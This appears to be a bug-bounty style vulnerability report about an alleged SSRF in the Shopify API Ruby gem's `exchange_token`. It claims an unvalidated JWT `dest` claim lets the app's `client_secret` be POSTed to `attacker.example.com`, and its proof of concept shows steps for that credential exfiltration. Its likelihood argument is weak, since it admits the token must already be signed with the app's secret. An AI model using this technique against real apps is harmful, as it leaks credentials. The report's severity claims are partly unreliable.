### Title
SSRF with app credentials via unvalidated JWT `dest` claim in `TokenExchange.exchange_token` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the outbound `access_token` request host directly from the session token's `dest` claim without validating that it is a trusted Shopify domain, unlike the sibling methods `client_credentials` and `migrate_to_expiring_token`, which explicitly sanitize the shop via `Utils::ShopValidator.sanitize!`.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the raw `dest` claim with no domain allow-listing: `@dest.gsub("https://", "")` [1](#0-0) . The only check performed on the token is the signature/expiry validation and that `aud == Context.api_key` [2](#0-1) ; the `dest` value itself is trusted verbatim.

In `exchange_token`, this unvalidated `dest_shop` is used directly to construct the session that determines the HTTP request destination:
```
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
...
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
``` [3](#0-2) 

`Clients::HttpClient#initialize` uses `session.shop` verbatim to build the request base URI: `@base_uri = "https://#{api_host || session.shop}"` [4](#0-3) . The POST body sent to that host includes the app's `client_secret` in plaintext: `client_secret: ShopifyAPI::Context.api_secret_key` [5](#0-4) .

Since a session token is only HMAC-signed with `Context.api_secret_key` and is presented by the embedded app's frontend (App Bridge) to the host application's backend, and the host application is documented to pass this token through to `exchange_token` largely unmodified, there is no cross-tenant signing barrier preventing another Shopify merchant/shop (which legitimately obtains a validly-signed session token for its own store) from setting/controlling a `dest` value that is not constrained to `*.myshopify.com`. Compare this to `client_credentials` and `migrate_to_expiring_token`, both of which call `Utils::ShopValidator.sanitize!(shop)` before constructing the session [6](#0-5) [7](#0-6) , explicitly restricting the destination host to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` [8](#0-7) . `exchange_token` has no equivalent call, breaking the identity binding: **the host that receives the `client_secret` == a domain validated to be a genuine Shopify shop**.

### Impact Explanation
This is the exact bug class called out in the rules: "a host validated versus the host that receives the access token or `client_secret`". If a session token's `dest` claim can be made to point at an attacker-controlled host (through any means where the token is validly signed but not restricted to Shopify domains — e.g. a malicious/compromised shop issuing itself a token, or any host-app flow that forwards a token without checking `dest` against the requesting shop), `exchange_token` will POST the app's `client_id`/`client_secret` plus the subject token to that attacker's host. That is a High-impact SSRF carrying the app's credentials, matching the accepted impact category.

### Likelihood Explanation
Reaching this path only requires calling the gem's own public, documented `TokenExchange.exchange_token` API with a session token whose signature validates (i.e., signed with `Context.api_secret_key`) — no access token, leaked secret, or privileged account is needed beyond a token that is properly signed. The asymmetry with `client_credentials`/`migrate_to_expiring_token` (which both sanitize the shop) demonstrates this is a gap in this specific function rather than a general host-app responsibility, since the gem takes on responsibility for shop validation elsewhere in the same module.

### Recommendation
Validate `dest_shop` in `TokenExchange.exchange_token` using `Utils::ShopValidator.sanitize!(dest_shop)` before constructing `shop_session`, mirroring the existing validation already performed in `client_credentials` and `migrate_to_expiring_token`.

### Proof of Concept
1. Obtain (or forge via a shop legitimately possessing/controlling its own signing flow) a session token whose `dest` claim is set to an attacker-controlled host, e.g. `dest: "https://attacker.example.com"`, signed with the app's real `api_secret_key` so `JwtPayload` validation passes.
2. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
3. Observe that `Clients::HttpClient` issues `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` in plaintext — confirmed by tracing `dest_shop` → `Session.new(shop: dest_shop)` → `HttpClient#initialize` (`@base_uri = "https://#{session.shop}"`) with no intervening `ShopValidator` call, unlike the parallel `client_credentials`/`migrate_to_expiring_token` methods.
